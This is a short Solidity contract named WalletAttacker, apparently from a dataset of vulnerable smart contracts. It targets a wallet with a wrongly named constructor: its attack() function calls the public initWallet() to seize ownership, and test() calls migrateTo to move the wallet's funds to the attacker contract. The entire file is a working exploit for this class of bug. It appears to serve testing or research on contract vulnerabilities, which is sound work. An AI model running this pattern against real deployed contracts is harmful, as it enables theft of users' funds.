pragma solidity ^0.4.24;

import "../dataset/access_control/wallet_03_wrong_constructor.sol";

contract WalletAttacker {
    Wallet public target;

    constructor(Wallet _target) public {
        target = _target;
    }

    function attack() public payable {
        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("initWallet()"))
        );

        (bool success, ) = target.call(data);
        require(success, "Attack failed");
    }

    function test() public payable {
        target.migrateTo(address(this));
    }

    function() public payable {}
}
